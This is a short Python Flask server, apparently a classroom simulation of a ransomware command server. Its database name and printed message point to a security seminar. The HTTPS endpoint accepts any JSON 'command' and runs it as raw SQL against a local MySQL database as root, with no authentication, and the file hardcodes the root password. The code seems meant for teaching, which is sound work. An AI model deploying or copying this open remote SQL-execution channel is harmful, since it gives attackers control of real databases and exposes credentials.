import mysql.connector
from flask import Flask, request, jsonify
import ssl
import os

def execute_sql(sql):
    try:
        db = mysql.connector.connect(
            host="127.0.0.1",
            user="root",
            password="Leo250262",
            database="seg_seminario"
        )
        print('ðŸŽ² ConexÃ£o estabelecida com o BD')

        cursor = db.cursor()
        cursor.execute(sql)

        # Filtro para comandos que retornam
        if cursor.with_rows:
            result = f"Query executada com sucesso. Resultados: \n {cursor.fetchall()}"
        else:
            db.commit()
            result = f"Query executada com sucesso. {cursor.rowcount} linha(s) afetada(s)."

        cursor.close()
        db.close()
        return result

    except Exception as e:
        return e

port = 8443
app = Flask(__name__)

@app.route("/api/v1/update", methods=["POST"])
def receive_command():
    data = request.get_json() # Pega JSON enviado pelo host

    # Extrai comando recebido pelo host
    command = data.get("command")
    print(f"[INFO] Comando recebido: {command}")

    sql_result = execute_sql(command)
    return jsonify({"result": str(sql_result)})


if __name__ == "__main__":
    print(f"Servidor simulado do ransomware iniciado em https://localhost:{port}")

    # Creates SSL context
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

    # Starts server
    app.run(host="0.0.0.0", port=port, ssl_context=ssl_context)